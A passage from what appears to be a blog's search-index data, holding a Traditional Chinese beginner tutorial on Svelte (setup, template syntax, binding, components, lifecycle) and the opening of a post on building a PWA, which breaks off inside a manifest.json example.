Svelte 線上開發環境了。\nREPL 是 read(讀取)、evaluate(執行)、print(打印) 和 loop(循環) 這幾個單詞的縮寫。\n如果你只是想嘗試 Svelte 的某些功能或者測試小型代碼，可以使用這款線上工具。\nREPL還提供了多組件開發，按左上角的 ＋ 可以創建新組件。組件的內容稍後會說到。\n界面右側，頂部有3個選項：\nResult： 運行結果。 JS output： Svelte 編譯後的 JS 代碼。 CSS output： Svelte 編譯後的 CSS 代碼。 在 REPL 界面右上角還有一個下載按鈕。\n當你在線上環境寫好代碼，可以點擊下載按鈕把項目保存到本地，下載的文件是一個 zip，需要自己手動解壓。\n然後使用以下命令初始化項目並運行即可。\n1 2 3 4 5 6 7 # 1. 初始化項目 npm install # 2. 運行項目 npm run dev # 3. 在瀏覽器訪問 http://localhost:5000 運行結果：\nRollup 版 Svelte 官方也提供了一個命令，可以下載 Svelte 項目到本地。\n命令最後需要輸入你的項目名稱。\n1 2 3 4 5 6 7 8 9 10 # 1. 下載模板 npx degit sveltejs/template 項目名稱 # 2. 安裝依賴 npm install # 3. 運行項目 npm run dev # 4. 在瀏覽器訪問 http://localhost:8080 運行結果：\n這是官方提供的創建項目方式，這個項目是使用 Rollup 打包的。 Rollup 和 Svelte 都是同一個作者（Rich Harris）開發的，用回自家東西很正常。\nWebpack 版 如果你不想使用 Rollup 打包項目，可以嘗試使用 Webpack。\n1 2 3 4 5 6 7 8 9 10 # 1. 下載模板 npx degit sveltejs/template-webpack 項目名稱 # 2. 安裝依賴 npm install # 3. 運行項目 npm run dev # 4. 在瀏覽器訪問 http://localhost:8080 運行結果：\nParcel 版 我並 不推薦使用 該方法創建項目，因為Svelte 並沒有提供使用Parcel 打包工具的模板。但 GitHub 上有第三方的解決方案（點擊訪問倉庫）。\n將DeMoorJasper/parcel-plugin-svelte的代碼下載下來。\n1 2 3 4 5 6 7 8 9 # 1. 進入 `packages/svelte-3-example` 目錄 # 2. 安裝依賴 npm install # 3. 運行項目 npm run start # 4. 在瀏覽器訪問 http://localhost:1234 運行結果：\nVite 版 本文接下來所有例子都是使用 Vite 創建 Svelte 項目進行開發的。\n使用 Vite 創建項目的原因是：快！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1. 下載模板 npm init vite@latest # 2. 輸入項目名稱 # 3. 選擇 Svelte 模板(我沒選ts) # 4. 安裝依賴 npm install # 5. 運行項目 npm run dev # 6. 在瀏覽器訪問 http://127.0.0.1:5173 運行結果：\n本文使用 Vite 創建項目，目錄結構和Rollup版創建出來的項目結構稍微有點不同，但開發邏輯是一樣的。\n起步 index.html、src/main.js 和 src/App.svelte 這三個是最主要的文件。\nindex.html 是項目運行的入口文件，它裡面引用了 src/main.js 文件。\nsrc/main.js 裡引入了 src/App.svelte 組件，並使用以下代碼將 src/App.svelte 的內容渲染到 #app 元素裡。\n1 2 3 const app = new App({ target: document.getElementById(\u0026#39;app\u0026#39;) }) target 指明目標元素。\n我們大部分代碼都是寫在 .svelte 後綴的文件裡。\n.svelte 文件主要確保 多個 HTML 元素、1個 script 元素 和 1個 style 元素。這3類元素都是可選的。\n我們主要的工作目錄是 src 目錄。\n為了減輕學習難度，我們先做這幾步操作。\n清空全局樣式 如果你使用Rollup版創建項目，不需要做這一步。\n在使用 Vite 創建的 Svelte 項目中，找到 src/app.css 文件，並把裡面的內容清空掉。\n改造 src/App.svelte 將 src/App.svelte 文件改成以下內容\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let name = \u0026#39;雷侯\u0026#39; function handleClick() { name = \u0026#39;鯊魚辣椒\u0026#39; } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;Hello {name}\u0026lt;/div\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt;改名\u0026lt;/button\u0026gt; 此時點擊按鈕，頁面上的\u0026quot;雷猴\u0026quot; 就會變成\u0026quot;鯊魚辣椒\u0026quot;\n上面的代碼其實和 Vue 有點像。\n變量和方法都寫在 \u0026lt;script\u0026gt; 標籤裡。 在 HTML 中使用 {} 可以綁定變量和方法。 通過 on:click 可以綁定點擊事件。 只需寫以上代碼，Svelte 就會自動幫我們做數據響應的操作。一旦數據發生改變，視圖也會自動改變。\n是不是非常簡單！\n基礎模板語法 Svelte 的模板語法其實和 Vue 是有點像的。如果你之前已經使用過 Vue，那本節學起來就非常簡單。\n插值 在\u0026quot;起步章節\u0026quot; 已經使用過 插值 了。在 Svelte 中，使用 {} 大括號將 script 裡的數據綁定到 HTML 中。\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; 此時頁面上就會出現 name 的值。\n這種語法和 Vue 是有點像的，Vue 使用雙大括號的方式 {{}} 綁定數據。 Svelte 就少一對括號。\n表達式 在 HTML 中除了可以綁定變量外，還可以綁定表達式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; function sayHi() { return `${name} 世界！` } let a = 1 let b = 2 let state = false \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{sayHi()}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{a} + {b} = {a + b}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{state ? \u0026#39;雷猴\u0026#39; : \u0026#39;鯊魚辣椒\u0026#39;}\u0026lt;/div\u0026gt; 屬性綁定 HTML 的屬性需要動態綁定數據時，也是使用 {} 語法。\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div title={name}\u0026gt;Hello\u0026lt;/div\u0026gt; 當鼠標放到 div 標籤上時，會出現 title 裡的提示信息。\n渲染 HTML 標籤 @html 如果只是使用插值的方法渲染帶有 HTML 標籤的內容，Svelte 會自動轉義 \u0026lt;、\u0026gt; 之類的標籤。\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;雷猴\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{h1El}\u0026lt;/div\u0026gt; 這種情況多數出現在渲染文本。\n在 Vue 中有 v-html 方法，它可以將 HTML 標籤渲染出來。在 Svelte 中也有這個方法，在插值前面使用 @html 標記一下即可。\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;雷猴\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{@html h1El}\u0026lt;/div\u0026gt; 但此方法有可能遭受 XSS 攻擊。\n我在 「NodeJS 防止 xss 攻擊」 中簡單演示過 XSS 攻擊，有興趣的可以看看。\n樣式綁定 在日常開發中，給 HTML 標籤設置樣式主要通過 行内 style 和 class 屬性。\n基礎的 HTML 寫法和原生的一樣，這裡不過多講解。\n下面主要講動態設置樣式，也就是將 JS 裡的變量或者表達式綁定到 style 或者 class 裡。\n行內樣式 style 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let color = \u0026#39;red\u0026#39; setTimeout(() =\u0026gt; { color = \u0026#39;blue\u0026#39; }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;color: {color}\u0026#34;\u0026gt;雷猴\u0026lt;/div\u0026gt; 1秒後，文字從紅色變成藍色。\n綁定class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let foo = true setTimeout(() =\u0026gt; { foo = false }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div class:active={foo}\u0026gt;雷猴\u0026lt;/div\u0026gt; \u0026lt;style\u0026gt; .active { color: red; } \u0026lt;/style\u0026gt; 在 HTML 裡可以使用 class:xxx 動態設置要激活的類。這裡的 xxx 是對應的類名。\n語法是 class:xxx={state}，當 state 為 true 時，這個樣式就會被激活使用。\n條件渲染 #if 使用 {#if} 開頭、{/if} 結尾。\n基礎條件判斷 1 2 3 {#if 条件判断} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {/if} 1秒後改變狀態\n兩種條件 1 2 3 4 5 {#if 条件判断} ... {:else} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;鯊魚辣椒\u0026lt;/div\u0026gt; {/if} 多種條件 1 2 3 4 5 {#if 條件判斷} ... {:else if 條件判斷} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let count = 1 setInterval(() =\u0026gt; { count++ }, 1000) \u0026lt;/script\u0026gt; {#if count === 1} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {:else if count === 2} \u0026lt;div\u0026gt;鯊魚辣椒\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;蟑螂惡霸\u0026lt;/div\u0026gt; {/if} 條件渲染的用法比較簡單，只要 JS 基礎就能看得懂。\n列表渲染 #each 如果你有一堆數據需要展示出來，可以使用 #each 方法。\n使用 {#each} 開頭、{/each} 結尾。\n遍歷數組 1 2 3 {#each expression as name} ... {/each} 舉個例子\n1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item} \u0026lt;li\u0026gt;{item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 要注意，Svelte 和 Vue 的遍歷在寫法上有點不同。\nVue 的方式是：\n1 2 3 \u0026lt;div v-for=\u0026#34;元素 in 源數據\u0026#34;\u0026gt; \u0026lt;span\u0026gt;{{元素}}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; Svelte 的方式是：\n1 2 3 4 5 \u0026lt;div\u0026gt; {#each 源數據 as 元素} \u0026lt;span\u0026gt;{元素}\u0026lt;/span\u0026gt; {/each} \u0026lt;/div\u0026gt; 遍歷數組(帶 index) 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item, index} \u0026lt;li\u0026gt;{index} -- {item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 注意：as 後面首先跟著元素，然後才是下標。而且元素和下標不需要用括號括起來。\n如果元素是對象，可以解構 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let list = [ {name: \u0026#39;雷猴\u0026#39;}, {name: \u0026#39;鯊魚辣椒\u0026#39;} ] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as {name}} \u0026lt;li\u0026gt;{name}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 默認內容 如果源數據沒有內容，是空數組的情況下，還可以組合 {:else} 一起使用。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let list = [] \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; {#each list as {name}} \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;暫無數據\u0026lt;/div\u0026gt; {/each} \u0026lt;/div\u0026gt; 事件綁定 on:event 使用 on: 指令監聽 DOM 事件，on: 後面跟隨事件類型\n語法：\n1 on:事件類型={事件名} 舉個例子，點擊按鈕時在控制台輸出\u0026quot;雷猴\u0026quot;。\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;雷猴\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={sayHi}\u0026gt;打招呼\u0026lt;/button\u0026gt; 綁定其他事件（比如change等）也是同樣的道理。\n事件修飾符 如果你只希望某些事件只執行一次，或者取消默認行為，或者阻止冒泡等，可以使用事件修飾符。\n語法：\n1 on:事件類型|修飾符={事件名} 舉個例子，我希望點擊事件只能執行一次，之後再點擊都無效，可以使用官方提供的 once 修飾符。\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;雷猴\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click|once={sayHi}\u0026gt;打招呼\u0026lt;/button\u0026gt; 從上圖可以看出，多次點擊都只是輸出1次\u0026quot;雷猴\u0026quot;。\n除了 once 之外，還有以下這些修飾符可以用：\npreventDefault：禁止默認事件。在程序運行之前調用event.preventDefault() stopPropagation：調用event.stopPropagation(), 防止事件到達下一個標籤 passive：改善了touch/wheel 事件的滾動表現（Svelte會在合適的地方自動加上它） capture：表示在capture階段而不是bubbling觸發其程序 once：程序運行一次後刪除自身 串聯修飾符 修飾符還可以串聯起來使用，比如 on:click|once|capture={...}\n但需要注意，有些特殊的標籤使用修飾符會出現\u0026quot;意想不到\u0026ldquo;的結果，比如 \u0026lt;a\u0026gt; 標籤。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function toLearn() { console.log(\u0026#39;還在思考要不要學Canvas\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;a href=\u0026#34;https://juejin.cn/post/7116784455561248775\u0026#34; on:click|once|preventDefault={toLearn} \u0026gt;去學習Canvas ？\u0026lt;/a\u0026gt; 本來是想給 \u0026lt;a\u0026gt; 標籤綁定一個點擊事件，第一次點擊時在控制台輸出一句話，並且禁止 \u0026lt;a\u0026gt; 標籤的默認事件。\n所以使用了 once 和 preventDefault 修飾符。\n但實際上並非如此。上面的代碼意思是 once 設定了只執行一次 toLearn 事件，並且只有一次 preventDefault 是有效的。\n只有點擊時就不觸發 toLearn 了，而且 preventDefault 也會失效。所以再次點擊時，\u0026lt;a\u0026gt;元素就會觸發自身的跳轉功能。\n數據綁定 bind 數據綁定通常會和表單元素結合使用。\nbind 可以做到雙向數據綁定的效果。我覺得 Svelte 裡的 bind 有點像 Vue 的 v-model。\n語法：\n1 bind:property={variable} input 單行輸入框 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; function print() { console.log(msg) } \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value={msg} /\u0026gt; \u0026lt;button on:click={print}\u0026gt;打印\u0026lt;/button\u0026gt; 如果只是使用 value={msg} 的寫法，input 默認值是 hello，當輸入框的值發生改變時，並沒有把內容反應回 msg 變量裡。\n此時就需要使用 bind 了。\n1 2 \u0026lt;!-- 省略部分代碼 --\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; textarea 多行文本框 多行文本框同樣綁定在 value 屬性上。\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;textarea type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; \u0026lt;p\u0026gt;{msg}\u0026lt;/p\u0026gt; input range 範圍選擇 因為都是 input 元素，只是 type 不同而已。所以範圍選擇元素同樣需要綁定value。\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let val = 3 \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; bind:value={val} min=0 max=10 /\u0026gt; \u0026lt;p\u0026gt;{val}\u0026lt;/p\u0026gt; radio 單選 單選框通常是成組出現的，所以要綁定一個特殊的值 bind:grout={variable}\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; let selected = \u0026#39;2\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;3\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{selected}\u0026lt;/p\u0026gt; checkbox 複選框 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let roles = [] \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;雷猴\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;鲨鱼辣椒\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;蟑螂恶霸\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;蝎子莱莱\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{roles}\u0026lt;/p\u0026gt; select 選擇器 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let selected = \u0026#39;a\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;select bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#39;a\u0026#39;\u0026gt;a\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;b\u0026#39;\u0026gt;b\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;c\u0026#39;\u0026gt;c\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; select multiple 選擇器 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let selected = [] \u0026lt;/script\u0026gt; \u0026lt;select multiple bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#34;雷猴\u0026#34;\u0026gt;雷猴\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;鲨鱼辣椒\u0026#34;\u0026gt;鲨鱼辣椒\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;蟑螂恶霸\u0026#34;\u0026gt;蟑螂恶霸\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;蝎子莱莱\u0026#34;\u0026gt;蝎子莱莱\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; 簡寫形式 如果 bind 綁定的屬性和在 JS 裡聲明的變量名相同，那可以直接綁定\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; let value = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value /\u0026gt; \u0026lt;p\u0026gt;{value}\u0026lt;/p\u0026gt; 這個例子中， bind:value 綁定的屬性是 value，而在 JS 中聲明的變量名也叫 value，此時就可以使用簡寫的方式。\n$: 聲明反應性 通過使用 $: JS label 語法作為前綴。可以讓任何位於top-level 的語句（即不在塊或函數內部）具有反應性。每當它們依賴的值發生更改時，它們都會在 component 更新之前立即運行。\n上面這段解釋是官方文檔的解釋。\n$:在文檔中稱為Reactivity，中文文檔成它為反應性能力。\n但我使用 $: 時，覺得這個功能有點像 Vue 的 computed。\n$: 可以監聽表達式內部的變化從而做出響應。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; let count = 0; $: doubled = count * 2; function handleClick() { count += 1; } \u0026lt;/script\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt; 點擊加1 \u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;{count} 翻倍後 {doubled}\u0026lt;/p\u0026gt; 使用 $: 聲明的 double 會自動根據 count 的值改變而改變。\n如果將以上代碼中 $: 改成 let 或者 var 聲明 count，那麼 count 將失去響應性。\n這樣看來，真的和 Vue 的 computed 的作用有那麼一點像。\n異步渲染 #await Svelte 提供異步渲染標籤，可以提升用戶體驗。\n語法：\n1 2 3 4 5 6 7 {#await expression} ... {:then name} ... {:catch name} ... {/await} 以 #await 開始、以 /await 結束。\n:then 代表成功結果，:catch 代表失敗結果。\nexpression是判斷體，要求返回一個Promise。\n其實用法和 #if ... :else if ... /if 有那麼一丟丟像。\n舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; const api = new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(\u0026#39;請求成功，數據是xxxxx\u0026#39;) }, 1000) }) \u0026lt;/script\u0026gt; {#await api} \u0026lt;span\u0026gt;Loading...\u0026lt;/span\u0026gt; {:then response} \u0026lt;span\u0026gt;{response}\u0026lt;/span\u0026gt; {:catch error} \u0026lt;span\u0026gt;{error}\u0026lt;/span\u0026gt; {/await} 如果將上面的 resolve 改成 reject 就會走 :catch 分支。\n基礎組件 在 Svelte 中，創建組件只需要創建一個 .svelte 為後綴的文件即可。\n通過 import 引入子組件。\n比如，在 src 目錄下有 App.svelte 和 Phone.svelte 兩個組件。\nApp.svelte 是父級，想要引入 Phone.svelte 並在 HTML 中使用。\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone /\u0026gt; Phone.svelte 1 \u0026lt;div\u0026gt;電話：13266668888\u0026lt;/div\u0026gt; 組件通訊 組件通訊主要是 父子組件 之間的數據來往。\n父傳子 比如上面的例子，手機號希望從 App.svelte 組件往 Phone.svelte 裡傳。\n可以在 Phone.svelte 中聲明一個變量，並公開該變量。\nApp.svelte 就可以使用對應的屬性把值傳入。\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone number=\u0026#34;88888888\u0026#34; /\u0026gt; Phone.svelte 1 2 3 4 5 \u0026lt;script\u0026gt; export let number = \u0026#39;13266668888\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;電話：{number}\u0026lt;/div\u0026gt; 如果此時 App.svelte 組件沒有傳值進來，Phone.svelte 就會使用默認值。\n子傳父 如果想在子組件中修改父組件的內容，需要把修改的方法定義在父組件中，並把該方法傳給子組件調用。\n同時需要在子組件中引入 createEventDispatcher 方法。\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; function print(data) { console.log(`手機號碼：${data.detail}`) } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone on:printPhone={print} /\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; import { createEventDispatcher } from \u0026#39;svelte\u0026#39; const dispatch = createEventDispatcher() function printPhone() { dispatch(\u0026#39;printPhone\u0026#39;, \u0026#39;13288888888\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={printPhone}\u0026gt;輸出手機號碼\u0026lt;/button\u0026gt; 父組件接受參數是一個對象，子組件傳過來的值都會放在 detail 屬性裡。\n插槽 slot 和 Vue 一樣，Svelte 也有組件插槽。\n在子組件中使用 \u0026lt;slot\u0026gt; 標籤，可以接收父組件傳進來的 HTML 內容。\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone\u0026gt; \u0026lt;div\u0026gt;電話：\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;13288889999\u0026lt;/div\u0026gt; \u0026lt;/Phone\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;style\u0026gt; .box { width: 100px; border: 1px solid #aaa; border-radius: 8px; box-shadow: 2px 2px 8px rgba(0,0,0,0.1); padding: 1em; margin: 1em 0; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;默认值\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; 生命週期 生命週期是指項目運行時，指定時期會自動執行的方法。\nSvelte 中主要有以下幾個生命週期：\nonMount： 組件掛載時調用。 onDestroy： 組件銷毀時執行。 beforeUpdate： 在數據更新前執行。 afterUpdate： 在數據更新完成後執行。 tick： DOM元素更新完成後執行。 以上生命週期都是需要從 svelte 裡引入的。\n用 onMount 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; import { onMount } from \u0026#39;svelte\u0026#39; let title = \u0026#39;Hello world\u0026#39; onMount(() =\u0026gt; { console.log(\u0026#39;onMount\u0026#39;) setTimeout(() =\u0026gt; title = \u0026#39;雷猴\u0026#39;, 1000) }) \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;{title}\u0026lt;/h1\u0026gt; 在組件加載完1秒後，改變 title 的值。\nonDestroy、beforeUpdate 和 afterUpdate 都和 onMount 的用法差不多，只是執行的時間條件不同。\ntick 是比較特殊的，tick 和 Vue 的 nextTick 差不多。\n在 Svelte 中，tick 的使用語法如下：\n1 2 3 4 5 \u0026lt;script\u0026gt; import { tick } from \u0026#39;svelte\u0026#39; await tick() // 其他操作 \u0026lt;/script\u0026gt; 總結 本文主要講解了 Svelte 的基礎用法，但 Svelte 的內容和 API 遠不止此。它還有很多高級的用法以及提供了過渡動畫功能等。\nSvelte 是一個 Web 應用的構建工具，它打包出來的項目體積比較小，性能強，不使用虛擬DOM。\n但 Svelte 的兼容性和周邊生態相比起 Vue 和 React 會差一點。\n所以日常項目中需要根據 Svelte 的優缺點進行取捨。\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52441500615_771efe89dd_o.png","permalink":"https://wayneblog.ga/2022-10-21/svelte-quick-start/","title":"前端新寵兒？ - Svelte 介紹"},{"content":" 參考網站\n參考網站\n參考網站\n前幾天與大家分享，當開啟Chrome內建的PWA功能，就可將PWA的網頁，一鍵變成一個應用程式，雖然說PWA只是在應用程式裡，包了Chrome的瀏覽器，但開啟時就像應用程式一般，讓網頁就像應用程式一般，其實簡單的來說，這就有點像PhoneGap的感覺，但比PhoneGap要來的簡單許多。\n因此只要將網頁加入一些簡單的宣告與設定，立即就可將一般的網頁變成PWA的網頁應用程式，真心覺得PWA是個好物，因此只要你會寫網頁，就可將你所設計的網頁變成一隻應用程式！\n將網頁變成Progressive Web Application(PWA) Step1：下載 Chrome 擴充套件 點我前往 「Web Server」 擴充套件\n首先，你可先下載Chrome的「Web Server」擴充程式，再點「CHOSOSE FOLDER」鈕，選擇已製作好的網頁目錄。\nStep2：檢查網頁 點一下連結，並檢查網頁是否能正常呈現。\nStep3：建立 manifest.json 更多 manifest.json 介紹，點我前往\n接著建立一個新的文件檔，並依的輸入應用程式名稱、圖示、與應用程式的URL，再將它儲存為「manifest.json」檔。\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, 